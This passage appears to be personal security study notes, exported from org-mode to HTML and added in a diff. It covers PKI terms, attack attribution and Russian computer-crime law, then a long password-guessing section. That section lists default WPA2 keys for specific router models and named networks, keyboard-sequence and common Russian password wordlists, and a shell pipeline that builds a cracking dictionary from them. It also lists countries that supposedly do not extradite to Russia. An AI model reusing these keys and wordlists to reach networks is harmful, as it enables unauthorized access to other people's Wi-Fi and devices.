+<b>PKCS</b> - for "Public Key Cryptography Standards"  published by RSA Security LLC
+</p>
+
+<p>
+public key infrastructure (PKI) - is a set of roles, policies, hardware, software and procedures. The X.509 standard
+defines the most commonly used format for public key certificates.
+</p>
+<ul class="org-ul">
+<li>certificate authority (CA) - stores, issues and signs the digital certificates</li>
+<li>registration authority (RA) - verifies the identity of entities requesting their digital certificates to be stored at
+the CA</li>
+<li></li>
+</ul>
+
+<p>
+Public key certificate - electronic document used to prove the validity of a public key
+</p>
+<ul class="org-ul">
+<li>include: digital signature of the issuer that has verified the certificate's contents</li>
+</ul>
+
+<p>
+Key derivation function - cryptographic algorithm that derives one or more secret keys from a secret value using a
+pseudorandom function.
+</p>
+<ul class="org-ul">
+<li>Ex. result of a Diffie–Hellman key exchange into a symmetric key for use with AES</li>
+<li>Ex. password hashing</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org3f21bc0" class="outline-2">
+<h2 id="org3f21bc0"><span class="section-number-2">5</span> terms</h2>
+<div class="outline-text-2" id="text-5">
+<ul class="org-ul">
+<li>mitigation strategy [mɪtɪˈgeɪʃn - стратегия смягчения последствий</li>
+<li>spoofing [spuːf] - имитация</li>
+<li>surveillance [sɜːˈveɪləns] - наблюдение</li>
+<li>Countersurveillance - противодействие наблюдению</li>
+<li>sousveillance [suː] - inverse surveillance. French words sur, meaning "above", and
+sous, meaning "below" - камера на голове - не направлено против surveillance</li>
+<li>Concealing [kənˈsiːlɪŋ] - сокрытие, скрывающий</li>
+<li>ransomware ransom — выкуп и software — программное обеспечение - вымогатель</li>
+<li>honeypot - система обнаружения нападения маскирующаяся под обычный сервер</li>
+<li>kill switch - emergency off button</li>
+<li>remote access trojan (RAT, sometimes called creepware)</li>
+<li>Adversarial [ædvəsəˈrɪəl] - враждебный</li>
+<li>Adversary [ˈædvəsərɪ] - неприятель</li>
+<li>malicious [məˈlɪʃəs] - злонамеренный</li>
+<li>nefarious [ni-ˈfer-ē-əs] - гнусный</li>
+<li>perpetrators [ˈpɜːpɪtreɪtə] - виновники преступлений</li>
+<li>extraneous [ɪkˈstreɪnɪəs] - чужеродный, посторонний, лишний</li>
+<li>susceptible [səˈseptəbl] - восприимчивый</li>
+<li>multitenant data center - многофункциональный центр обработки данных</li>
+<li>distributed ledgers - распределенные бухгалтерские книги</li>
+<li>liability [laɪəˈbɪlɪtɪ] - ответственность</li>
+<li>assess [əˈses] - оценивать</li>
+<li>disguise [dɪsˈgaɪz] - маскировать</li>
+<li>coercion and deterrence [kəʊˈɜːʃn] [dɪˈterəns] - принуждение и сдерживание</li>
+<li>negligible [ˈneglɪʤəbl] - пренебрежимо малый</li>
+<li>feasibly [ˈfiːzəblɪ] - осуществимо</li>
+<li>snooping [ˈsnuːpɪŋ] - слежка, прослушивание</li>
+<li>plausible deniability [ˈplɔːzəbl] (dɪˌnaɪəˈbɪlɪtɪ) - правдоподобное отрицание (deniable - спорный) - отрицание факта
+наличия щифрования или расшифровывания только отвлекающих данных</li>
+<li>obscures [əbˈskjʊə] - obscures malicious traffic within normal traffic</li>
+<li>Cryptographic primitive - low-level cryptographic algorithms
+<ul class="org-ul">
+<li>One-way hash function</li>
+<li>Symmetric key cryptography - cryptographic keys for both the encryption the decryption (ex. AES)</li>
+<li>Public-key cryptography (ex. RSA)</li>
+<li>Digital signatures</li>
+<li>Mix network</li>
+<li>Private information retrieval - get database information without server knowing which item was requested</li>
+<li>Commitment scheme - allows one to commit to a chosen value while keeping it hidden to others, with the ability to reveal it later</li>
+</ul></li>
+<li>Salt - random data that is used as an additional input to a one-way function that hashes data, a password or
+passphrase/ Salts defend against attacks that use precomputed tables (e.g. rainbow tables)</li>
+<li>Cryptographic nonce - is an arbitrary number that can be used just once in a cryptographic communication - a random or
+pseudo-random number issued in an authentication protocol to ensure that old communications cannot be reused in replay
+attacks.</li>
+<li>Rainbow table - precomputed table for caching the output of cryptographic hash functions</li>
+<li>reverse shell - shell session established on a connection that is initiated from a remote machine, not from the local
+host</li>
+<li>Data exfiltration - malicious actor carries out an unauthorized data transfer from a computer</li>
+<li>infiltration  [ɪnfɪlˈtreɪʃn] - проникновение</li>
+<li>Command-and-control (C&amp;C or C2) - malicious communication between a C&amp;C server and malware</li>
+<li>red-team assessment [əˈsesmənt] - оценка, similar to a penetration test. blue team - defenders.</li>
+</ul>
+</div>
+<div id="outline-container-orgd547dc7" class="outline-3">
+<h3 id="orgd547dc7"><span class="section-number-3">5.1</span> security terms</h3>
+<div class="outline-text-3" id="text-5-1">
+<ul class="org-ul">
+<li><b>Information security</b> - practice of protecting information by mitigating information risks. It is
+part of information risk management.</li>
+<li><b>Security engineering</b> - process of incorporating security controls into an information system so
+that the controls become an integral part of the system’s operational capabilities</li>
+<li><b>Intrusion detection system</b> - device or software application that monitors a network or systems
+for malicious activity or policy violations. collected centrally using a security information and
+event management (SIEM) system
+<ul class="org-ul">
+<li>network intrusion detection systems (NIDS)</li>
+<li>host-based intrusion detection systems (HIDS)</li>
+</ul></li>
+<li><b>Countersurveillance</b></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2d018f8" class="outline-2">
+<h2 id="org2d018f8"><span class="section-number-2">6</span> law</h2>
+<div class="outline-text-2" id="text-6">
+</div>
+<div id="outline-container-org03d5cf9" class="outline-3">
+<h3 id="org03d5cf9"><span class="section-number-3">6.1</span> cyber attacker/attack attribution</h3>
+<div class="outline-text-3" id="text-6-1">
+<ul class="org-ul">
+<li>Attribution is the art of answering a question:  who did it?</li>
+<li>Sine qua non - latin условие, без которого</li>
+<li>The attribution of an attack to a state or state agents is a condicio sine qua non under
+international law.</li>
+</ul>
+
+
+<ul class="org-ul">
+<li>tactical goal - technical aspects, <b>the how</b>
+<ul class="org-ul">
+<li>What was the intrusion mechanism?</li>
+</ul></li>
+<li>perational goal - the attack’s high-level architecture and the attacker’s profile — <b>the what</b>
+<ul class="org-ul">
+<li>What was the motive?</li>
+</ul></li>
+<li>strategic goal - assessing the attack’s rationale, significance, appropriate response — the who
+and why.</li>
+<li>communication - communicating the outcome of a labour-intensive forensic investigation</li>
+</ul>
+
+<p>
+aperture: the scope of sources that can be brought to bear on a specific investigation
+</p>
+</div>
+
+<div id="outline-container-orgc64e2d0" class="outline-4">
+<h4 id="orgc64e2d0"><span class="section-number-4">6.1.1</span> techs</h4>
+<div class="outline-text-4" id="text-6-1-1">
+<ol class="org-ol">
+<li>Store Logs &amp; Traceback Queries</li>
+<li>Perform Input Debugging</li>
+<li>Modify Transmitted Messages</li>
+<li>Transmit Separate Messages (e.g., iTrace)</li>
+<li>Reconfigure &amp; Observe Network</li>
+<li>Query Hosts</li>
+<li>Insert Host Monitor Functions</li>
+<li>Match Streams (via headers, content, and/or timing)</li>
+<li>Exploit/Force Attacker Self-Identification (e.g., beacons, web bugs, cookies, watermarking)</li>
+<li>Observe Honeypot/honeynet</li>
+<li>Employ Forward-deployed Intrusion Detection Systems (IDSs)</li>
+<li>Perform Filtering (e.g., Network Ingress Filtering)</li>
+<li>Implement Spoof Prevention</li>
+<li>Secure Hosts/Routers  (e.g., “Hack Back”)</li>
+<li>Surveil Attacker</li>
+<li>Employ Reverse Flow</li>
+<li>Combine Techniques</li>
+</ol>
+
+<p>
+<a href="https://www.researchgate.net/publication/235170094_Techniques_for_Cyber_Attack_Attribution">https://www.researchgate.net/publication/235170094_Techniques_for_Cyber_Attack_Attribution</a>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-orgb685581" class="outline-3">
+<h3 id="orgb685581"><span class="section-number-3">6.2</span> rus</h3>
+<div class="outline-text-3" id="text-6-2">
+<p>
+<a href="http://www.ceae.ru/urids-komp-prestup.htm">http://www.ceae.ru/urids-komp-prestup.htm</a>
+</p>
+
+
+<p>
+Управление "К" МВД РФ и отделы "К" региональных управлений внутренних дел,входящие в состав Бюро
+специальных технических мероприятий МВД РФ.
+</p>
+
+<p>
+ общим объектом компьютерных преступлений будет совокупность всех общественных отношений, охраняемых
+уголовным законом, родовым - общественная безопасность и общ. порядок; видовым - совокупность
+общественных отношений по правомерному и безопасному использованию информации; непосредственный
+объект трактуется исходя из названий и диспозиций конкретных статей.
+</p>
+
+
+<p>
+Отсутствие посягательства на эти общественные отношения (либо незначительность такого
+посягательства) исключает уголовную ответственность в силу ч. 2 ст. 14 УК РФ
+</p>
+
+<p>
+гл. 28 УК, которое говорит не о посягательстве на объект, а о посягательствах в определенной "сфере".
+</p>
+
+<p>
+Преступлениями в сфере компьютерной информации являются:
+</p>
+<ol class="org-ol">
+<li>Неправомерный доступ к компьютерной информации (ст.272 УК РФ);</li>
+<li>Создание, использование и распространение вредоносных программ для ЭВМ (ст.273 УК РФ);</li>
+<li>Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст.274 УК РФ);</li>
+</ol>
+
+<p>
+Физическое повреждение или уничтожение компьютерной техники, незаконное завладение ею, а равно
+машинными носителями (дискетами, CD-R дисками), как предметами, обладающими материальной ценностью,
+квалифицируются по статьям главы 21 УК РФ
+</p>
+
+<p>
+Между деянием и последствиями обязательно должна быть установлена причинная связь.
+</p>
+
+<p>
+Субъективная сторона компьютерных преступлений характеризуется умышленной виной.
+</p>
+
+<p>
+В ч. 2 ст. 24 сказано, что деяние совершенное по неосторожности признается преступлением только тогда, когда это специально предусмотрено соответствующей статьей Особенной части УК
+</p>
+
+<p>
+лицо, имеющее доступ к ЭВМ, системе ЭВМ или их сети.
+</p>
+</div>
+
+<div id="outline-container-org01813ea" class="outline-4">
+<h4 id="org01813ea"><span class="section-number-4">6.2.1</span> Неправомерный доступ к компьютерной информации ( ст. 272 УК)</h4>
+<div class="outline-text-4" id="text-6-2-1">
+<p>
+если это деяние повлекло уничтожение. Блокирование, модификацию, либо копирование информации,
+нарушение работы ЭВМ, системы ЭВМ или их сети.
+</p>
+
+<p>
+Эта информация должна быть чужой для осуществляющего неправомерный доступ
+</p>
+
+<p>
+Субъективная сторона преступления характеризуется виной в форме умысла: лицо сознает, что
+осуществляет неправомерный (несанкционированный) доступ к охраняемой законом компьютерной
+информации, предвидит, что в результате производимых им действий могут наступить или неизбежно
+наступят указанные в законе вредные последствия, и желает (прямой умысел) или сознательно допускает
+(косвенный умысел) их наступления либо относится к ним безразлично.
+</p>
+</div>
+</div>
+<div id="outline-container-org2b34d90" class="outline-4">
+<h4 id="org2b34d90"><span class="section-number-4">6.2.2</span> Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст. 274 УК)</h4>
+<div class="outline-text-4" id="text-6-2-2">
+<p>
+повлекшее уничтожение, блокирование или модификацию охраняемой законом информации, если это деяние
+причинило существенный вред.
+</p>
+</div>
+</div>
+<div id="outline-container-org987e64e" class="outline-4">
+<h4 id="org987e64e"><span class="section-number-4">6.2.3</span> Список стран, не выдающих преступников РФ</h4>
+<div class="outline-text-4" id="text-6-2-3">
+<ul class="org-ul">
+<li>Великобритания;</li>
+<li>Китай;</li>
+<li>Америка;</li>
+<li>Беларусь;</li>
+<li>Украина;</li>
+<li>Израиль;</li>
+<li>Польша;</li>
+<li>Швеция;</li>
+<li>Венесуэла;</li>
+<li>Япония - Из-за отсутствия двустороннего соглашения Япония не выдает преступников России.</li>
+</ul>
+
+<p>
+Камбодже, Тринидаде, Никарагуа, Тобаго
+</p>
+
+<p>
+*
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgae7b2f9" class="outline-2">
+<h2 id="orgae7b2f9"><span class="section-number-2">7</span> Organizations <a href="https://owasp.org/">https://owasp.org/</a></h2>
+<div class="outline-text-2" id="text-7">
+<ul class="org-ul">
+<li>OWASP - online community that produces freely-available articles, methodologies, documentation,
+tools, and technologies in the field of web application security</li>
+<li>Security Industry Association - representing electronic and physical security solutions providers</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org8e716b1" class="outline-2">
+<h2 id="org8e716b1"><span class="section-number-2">8</span> password</h2>
+<div class="outline-text-2" id="text-8">
+</div>
+<div id="outline-container-org642c104" class="outline-3">
+<h3 id="org642c104"><span class="section-number-3">8.1</span> most common</h3>
+<div class="outline-text-3" id="text-8-1">
+<ol class="org-ol">
+<li>Default passwords</li>
+<li>key sequence, reverse key sequences</li>
+<li>personal information
+<ul class="org-ul">
+<li>name</li>
+<li>birthday - 1/1/1970 1.1.1970, 1/1/70</li>
+<li>phone number 89&#x2026;&#x2026;&#x2026; or +79&#x2026;&#x2026;&#x2026;</li>
+<li>personal number</li>
+<li>address</li>
+<li>nicknames</li>
+</ul></li>
+<li>space specific: site, company, chat</li>
+<li>language specific words and universal worlds</li>
+<li>double 3,4,5 words</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-orga9d1ece" class="outline-3">
+<h3 id="orga9d1ece"><span class="section-number-3">8.2</span> Default passwords wifi WPA2</h3>
+<div class="outline-text-3" id="text-8-2">
+<p>
+password, default, admin, root, guest, year2000, manager, digit, private, D-Link, alpine, telco
+</p>
+<ul class="org-ul">
+<li><a href="https://www.routerpasswords.com/">https://www.routerpasswords.com/</a></li>
+<li><a href="https://github.com/3mrgnc3/RouterKeySpaceWordlists">https://github.com/3mrgnc3/RouterKeySpaceWordlists</a></li>
+<li>TP Link - 8 chars [0-9]</li>
+<li>qtech: 32625585</li>
+<li>hiawei: 07225C45827</li>
+<li>ZTE: eCavtVDe, d21????F</li>
+<li>keenetic: ncKxATQn
+<ul class="org-ul">
+<li>keenetic-3055:cMHsmdj3</li>
+<li>keenetic-4345:9mftKELH</li>
+<li>keenetic-0809:ouzPMWxL</li>
+<li>Keenetic(ZyXEL): en5Klc55</li>
+</ul></li>
+<li>ZyXEL Kenetic Giga:pin:51029203</li>
+<li>netis:password</li>
+<li>Wifire-2.4: YFOP7PBM</li>
+<li>WiFi-DOM.ri:KCAmwrPiGH</li>
+<li>Ростелеком:BFW7P3PQ, RT<sub>WiFi</sub><sub>ADE8</sub>:v2VKfEyg, RT<sub>WiFi</sub><sub>0E65</sub>:Ce2ch5ex
+<ul class="org-ul">
+<li>RT<sub>Wifi</sub>:user:qtech,pass:qtech</li>
+<li>RT-WIFI QTECH:123456789012</li>
+<li>RT<sub>WiFi</sub>(ZTE CORP):gqYyAaeX</li>
+<li>ROSTELECOM<sub>(Sagemcom)</sub>:MCR4F64F</li>
+</ul></li>
+<li>MTSRouter<sub>(SERCOMM)</sub>:RRgA9jTF
+<ul class="org-ul">
+<li>UniversalRouterMTS(Sagemcom):VG97ACNG,admin,mts</li>
+<li>MTSRouter(D-Link):43621996, MTSRouter(D-Link DIR-615):37674724</li>
+<li>MTSRouter<sub>2.4G</sub>(SERCOMM):8-chan up down alphanumeric</li>
+<li>MTS<sub>Router</sub><sub>240985</sub>-77ed-D-Link<sub>International</sub>: 10048566</li>
+<li>MTSRouter<sub>404E27</sub>(D-Link<sub>International</sub>):8 chars [0-9]</li>
+</ul></li>
+<li>MGTS<sub>GPON</sub>
+<ul class="org-ul">
+<li>SERCOMM
+<ul class="org-ul">
+<li>MGTS<sub>GPON</sub><sub>9921</sub>: H6RU5R6P - SERCOMM</li>
+<li>MGTS<sub>GPON</sub><sub>7901</sub>: JMZQ88VZ - SERCOMM</li>
+<li>9883: ZCMKTKSS</li>
+<li>MGTS<sub>GPON</sub><sub>9949</sub> / MGTS<sub>GPON5</sub><sub>9949</sub> : MQK6MNTK</li>
+</ul></li>
+<li>zte corporation
+<ul class="org-ul">
+<li>MGTS<sub>GPON</sub><sub>37E1</sub>: 23f3de64</li>
+<li>MGTS<sub>GPON</sub><sub>3ED2</sub>: 8ab8b02f</li>
+<li>MGTS<sub>GPON</sub><sub>F337</sub> / MGTS<sub>GPON5</sub><sub>F337</sub> : nbNjFWGb</li>
+<li>MGTS<sub>GPON</sub><sub>4AFE</sub> / MGTS<sub>GPON5</sub><sub>4AFE</sub> : eft6n7jK</li>
+</ul></li>
+</ul></li>
+<li>GPON терминал - ZTE-bc865e: 981428bc</li>
+<li>Beeline(SmartBox turbo+):mnm2xq6x
+<ul class="org-ul">
+<li>Beeline(SmartBox one):WJmNgmX6AT</li>
+</ul></li>
+<li>MERCUSYS_:25399653</li>
+<li>(Huawei home router)SUPERONLINE<sub>WiFi</sub>:94HTFJTAYMMY
+<ul class="org-ul">
+<li>VDF-HG532e:WEB:</li>
+<li>WirelessNet(EchoLife):mgtswifi</li>
+<li>HUAWEI-v7e9:485754438DF0639D</li>
+<li>4G-Mobile-WiFi:e</li>
+</ul></li>
+<li>UR-325BN: D4BF7F05AF2D</li>
+<li>HGU0C830:624AC830</li>
+<li>D-Ling(DIR-620):pin:1234123412</li>
+<li>ASUS:pin:00343459,pin:38472585</li>
+<li>TRENDnet810<sub>2.4</sub>:81031005793,admin,BY6Q3AKD</li>
+<li>ZTE:2sat943s</li>
+<li>ubiquiti networks: ubnt/ubnt, no default WPA pass - must be set up</li>
+<li>AndroidAP: yjru7079</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgdf35c12" class="outline-3">
+<h3 id="orgdf35c12"><span class="section-number-3">8.3</span> key sequence</h3>
+<div class="outline-text-3" id="text-8-3">
+<ul class="org-ul">
+<li>password, adminadmin, AdminAdmin, passWord, PassWord</li>
+<li>123, 1234, 12345, 123456, 1234567, 12345678, 123456789</li>
+<li>qwe, qwer, qwert, qwerty, qwertyu, qwertyui, qwertyuio, qwertyuiop</li>
+<li>asd, asdf, asdfg, asdfgh, asdfghj, asdfghjk, asdfghjkl</li>
+<li>zxc, zxcv, zxcvb, zxcvbn, zxcvbnm, zxcvbnm,</li>
+<li>qazqaz, qazqazqaz, wsxwsx, wsxwsxwsx, edcedc, edcedcedc</li>
+<li>1qaz, 1qaz2wsx, 1qaz2wsx3edc</li>
+<li>qazwsx, qazwsx123, 123qazwsx, qazwsxedc, qazwsxedcrfv</li>
+<li>qazxsw, 123qazxsw, qazxswedc</li>
+<li>abcd, abcde, abcdef, abcdefg, abcdefgh</li>
+<li>1q2w3e4r5t6y, 1q2w3e4r5t6, 1q2w3e4r5t, 1q2w3e4r5, 1q2w3e4r, 1q2w3e4, 1q2w3e, 1q2w3, 1q2w</li>
+<li>q1w2e3r4t5y6, q1w2e3r4t5y, q1w2e3r4t5, q1w2e3r4t, q1w2e3r4, q1w2e3r, q1w2e3, q1w2e, q1w2</li>
+<li>REP8 4-10: alphabet+spec = aaaaaaaa, bbbbbbbb, 11111111</li>
+<li>PERM2 2-4: 1 2 3 4 5 6 7 8 9 - = = 12121212, 32323232, -<code>-</code>-<code>-</code></li>
+<li>PROD 2-3: 123 qwe asd zxc 321 ewq dsa cxz = 123123, 123qwe, qwe123</li>
+<li>PROD 2: 1234 qwer asdf zxcv 4321 rewq fdsa vcxz = 12341234, 1234qwer,</li>
+<li>RARE! REP2: 12345, qwert, asdf, zxcvb, 54321, trewq, fdsa, bvcxz</li>
+<li>PROD2,3: qaz wsx, edc, zaq xsw, cde, 123, 321</li>
+<li>PROD2: 1qaz, 2wsx, 3edc, zaq1, xsw2, cde3</li>
+<li>PROD4: 12, 21, qw, as, zx, wq, sa, xz</li>
+<li>PROD4: 12, 21, po, op, lk, kl, mn, nm</li>
+<li>PAIRS2-4 from: qwertyuiop[], asdfghjkl;', zxcvbnm, (and reverse): qwqwqwqw, wewewewe</li>
+<li>adadadad, asasasas, asas, qeqeqeqe, qeqe, zczc, zczczczc, qeqe, qeqeqeqe</li>
+<li>1234567a, 123456aa, 1234aaaa, 123aaaa</li>
+<li>a1234567, aa123456, aaa12345, aaaa1234</li>
+<li>11223344, 1122334455, 111222333, 11112222</li>
+<li>1234abcd, 12345abcd, 12345abc, 123456abcd, 12345abc, 123456abc</li>
+<li>123456789a, 1234567a, 1234567b, 12345678b, 1234567c</li>
+<li>a123456789, a1234567, b1234567, b12345678, c1234567</li>
+<li>789456123, 890567234, 321654987</li>
+<li>qwerty123, qwert123, 123qwerty, qwert123, 12345qwe, 12345qwer, 123456qw</li>
+<li>1234567890, 123456789, 12345678, 0123456789, 012345678</li>
+<li>12344321, 123454321, 1234554321</li>
+<li>1qazxsw2</li>
+<li>102030405, 102030405, 1020304050, 102030406, 01020304, 0102030405</li>
+<li>147258369, 741852963, 963852741</li>
+<li>qwaszx, 123qwaszx, qwaszx123, zxasqw, zxasqw123, 123zxasqw</li>
+<li>1234567891</li>
+<li>1qazxsw2</li>
+<li>1029384756, 0192837465, 1092387456, 0129834765</li>
+<li>zaq12wsx</li>
+<li>0987654321, 098765432, 09876543, 0987654, 098765, 09876, 0987, 098</li>
+<li>!@#$%^&amp;*()_+, !@#$%^&amp;*()_, !@#$%^&amp;*(), !@#$%^&amp;*(, !@#$%^&amp;*</li>
+</ul>
+
+<p>
+transfer:
+</p>
+<ol class="org-ol">
+<li>copy this to file key<sub>sequences</sub></li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-sh">cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> &gt; key_sequences_cap
+cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> | tr [:lower:] [:upper:] &gt;&gt; key_sequences_cap
+cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> | tr [:upper:] [:lower:] &gt;&gt; key_sequences_cap
+cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> | rev &gt;&gt; key_sequences_cap
+cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> | rev | tr [:lower:] [:upper:] &gt;&gt; key_sequences_cap
+cut -d <span style="color: #95e454;">" "</span> -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed <span style="color: #95e454;">'s/, /\n/g'</span> | rev | tr [:upper:] [:lower:] &gt;&gt; key_sequences_cap
+cat key_sequences_cap | uniq |sed -nr <span style="color: #95e454;">'/^.{8,12}$/p'</span> &gt; key_sequences_cap8-12u
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2dcacba" class="outline-3">
+<h3 id="org2dcacba"><span class="section-number-3">8.4</span> dates</h3>
+<div class="outline-text-3" id="text-8-4">
+<ul class="org-ul">
+<li>year, month, date - date, month, year
+<ul class="org-ul">
+<li>simple</li>
+<li>0</li>
+<li>with/without 0 with special characters as separators .,_,-,/,#</li>
+<li>without 20 and 19 in year</li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orga8a9b28" class="outline-3">
+<h3 id="orga8a9b28"><span class="section-number-3">8.5</span> patterns or modifiers</h3>
+<div class="outline-text-3" id="text-8-5">
+<ul class="org-ul">
+<li>divide letters to 1,2,3,4 parts - first, one of, or every second is capital
+<ul class="org-ul">
+<li>The first letter is a capital letter.</li>
+</ul></li>
+<li>additional characters</li>
+<li>simple obfuscation or Replacement Password Pattern</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org4588683" class="outline-3">
+<h3 id="org4588683"><span class="section-number-3">8.6</span> additional charactes</h3>
+<div class="outline-text-3" id="text-8-6">
+<ul class="org-ul">
+<li>simple - 1, 11, 12, 13, 123, a, q, qq, aa, 0, 00, 01, 2, 3, 7, ., _, !, -, @, *, #, /, $</li>
+<li>double and triple of 1 character simple</li>
+<li>any digital double - 11, 22, 33</li>
+<li>zero + 1 digital: 01,02,03,04</li>
+<li>special numbers - 50,100,1000,300,30,18,7</li>
+<li>english: ',</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org2d1398f" class="outline-3">
+<h3 id="org2d1398f"><span class="section-number-3">8.7</span> simple obfuscation or Replacement Password Pattern</h3>
+<div class="outline-text-3" id="text-8-7">
+<ul class="org-ul">
+<li>a - @</li>
+<li>o - 0</li>
+<li>i/l - 1/|</li>
+<li>s - 5/$</li>
+<li>b/g - 6</li>
+<li>g - 9</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1724d2c" class="outline-3">
+<h3 id="org1724d2c"><span class="section-number-3">8.8</span> words</h3>
+<div class="outline-text-3" id="text-8-8">
+<p>
+cat words | grep -v "<sup>*</sup>" | cut -f 2- -d ' ' | sed 's/, /\n/g'
+</p>
+</div>
+<div id="outline-container-org89d81a7" class="outline-4">
+<h4 id="org89d81a7"><span class="section-number-4">8.8.1</span> rus:</h4>
+<div class="outline-text-4" id="text-8-8-1">
+<ul class="org-ul">
+<li>russia</li>
+<li>belgorod</li>
+<li>stalker</li>
+<li>spartak</li>
+<li>avtoplus</li>
+<li>knopka</li>
+<li>sobaka</li>
+<li>privet</li>
+<li>matrix</li>
+<li>nirvana</li>
+<li>eminem</li>
+<li>zvezda</li>
+<li>kolobok</li>
+<li>flatron</li>
+<li>ronaldo</li>
+<li>ivanov</li>
+<li>windows</li>
+<li>viktoria</li>
+<li>kotenok</li>
+<li>scorpion</li>
+<li>romashka</li>
+<li>mamapapa</li>
+<li>mama</li>
+<li>moloko</li>
+<li>vladislav</li>
+<li>svetik</li>
+<li>arsenal</li>
+<li>solnce</li>
+<li>cjkywt</li>
+<li>cjkysirj</li>
+<li>lokomotiv</li>
+<li>kaktus</li>
+<li>kakashka</li>
+<li>barsik</li>
+<li>pupsik</li>
+<li>barcelona</li>
+<li>nokia</li>
+<li>sandra</li>
+<li>slipknot</li>
+<li>agent007</li>
+<li>pantera</li>
+<li>mazafaka</li>
+<li>zvezda</li>
+<li>abrakadabra</li>
+<li>svoboda</li>
+<li>kazantip</li>
+<li>krasotka</li>
+<li>chelsea</li>
+<li>cocacola</li>
+<li>nikitos</li>
+<li>ivanova</li>
+<li>fackinshet</li>
+<li>antonio</li>
+<li>azamat</li>
+<li>пароль, gfhjkm</li>
+<li>karolina</li>
+<li>telefon</li>
+<li>avatar</li>
+<li>maestro</li>
+<li>linkinpark</li>
+<li>PolniyPizdec</li>
+<li>mamamama</li>
+<li>koroleva</li>
+<li>mamochka</li>
+<li>creative</li>
+<li>infiniti</li>
+<li>vfvfvfvf</li>
+<li>superstar</li>
+<li>blablabla</li>
+<li>piramida</li>
+<li>mandarin</li>
+<li>armagedon</li>
+<li>manchester</li>
+<li>dagestan</li>
+<li>solnishko</li>
+<li>papamama</li>
+<li>dtxyjcnm</li>
+<li>juventus</li>
+<li>adrenalin</li>
+<li>gladiator</li>
+<li>karamelka</li>
+<li>koshechka</li>
+<li>kukuruza</li>
+<li>alina</li>
+<li>klubnika</li>
+<li>babushka</li>
+<li>dedushka</li>
+<li>belochka</li>
+<li>strekoza</li>
+<li>arhangel</li>
+<li>marmelad</li>
+<li>avangard</li>
+<li>sukasuka</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org5fc45e1" class="outline-4">
+<h4 id="org5fc45e1"><span class="section-number-4">8.8.2</span> rus names</h4>
+<div class="outline-text-4" id="text-8-8-2">
+<ul class="org-ul">
+<li>sergey</li>
+<li>andrey</li>
+<li>natasha</li>
+<li>nastya</li>
+<li>maksim</li>
+<li>svetlana</li>
+<li>kirill</li>
+<li>aleksandr</li>
+<li>kristina</li>
+<li>polina</li>
+<li>serega</li>
+<li>ruslan</li>
+<li>oksana</li>
+<li>natali</li>
+<li>vladimir</li>
+<li>karina</li>
+<li>viktor</li>
+<li>galina</li>
+<li>veronika</li>
+<li>andrei</li>
+<li>valera</li>
+<li>ekaterina</li>
+<li>valentina</li>
+<li>valentin</li>
+<li>elena</li>
+<li>lenochka</li>
+<li>sasha</li>
+<li>katerina</li>
+<li>larisa</li>
+<li>sergei</li>
+<li>olga</li>
+<li>alexander</li>
+<li>alex</li>
+<li>anastasia</li>
+<li>angelina</li>
+<li>irina</li>
+<li>vladik</li>
+<li>tatyana</li>
+<li>dima</li>
+<li>aleksey</li>
+<li>deniska</li>
+<li>vitalik</li>
+<li>bogdan</li>
+<li>danila</li>
+<li>dmitriy</li>
+<li>tamara</li>
+<li>alexandr</li>
+<li>daniil</li>
+<li>margarita</li>
+<li>victoria</li>
+<li>viktoriya</li>
+<li>victor</li>
+<li>anastasiya</li>
+<li>natalia</li>
+<li>nikolay</li>
+<li>slavik</li>
+<li>valeria</li>
+<li>oleg</li>
+<li>alinka</li>
+<li>alina</li>
+<li>maksimka</li>
+<li>aleksandra</li>
+<li>alenka</li>
+<li>kostya</li>
+<li>artemka</li>
+<li>artem</li>
+<li>rustam</li>
+<li>kostik</li>
+<li>evgeny</li>
+<li>evgeniy</li>
+<li>evgesha</li>
+<li>hanihani</li>
+<li>ljxtymrf</li>
+<li>rhjrjlbk</li>
+<li>timoxa</li>
+<li>ghjcnjnfr</li>
+<li>yjdsqgfhjkm</li>
+<li>milashka</li>
+<li>amadeus</li>
+<li>vasilisa</li>
+<li>konstantin</li>
+<li>valentin</li>
+<li>stanislav</li>
+<li>marishka</li>
+<li>margosha</li>
+<li>marianna</li>
+<li>valeriya</li>
+<li>nadezhda</li>
+<li>dimochka</li>
+<li>mashenka</li>
+<li>alino4ka</li>
+<li>yanochka</li>
+<li>OLOLO</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org66d8bd5" class="outline-4">
+<h4 id="org66d8bd5"><span class="section-number-4">8.8.3</span> universal:</h4>
+<div class="outline-text-4" id="text-8-8-3">
+<ul class="org-ul">
+<li>wifi</li>
+<li>naruto</li>
+<li>qwerty</li>
+<li>superman</li>
+<li>love</li>
+<li>loveme</li>
+<li>iloveyou</li>
+<li>ilovesex</li>
+<li>loveyou</li>
+<li>fuck</li>
+<li>fuckyou</li>
+<li>fuckoff</li>
+<li>fuckme</li>
+<li>test</li>
+<li>computer</li>
+<li>password</li>
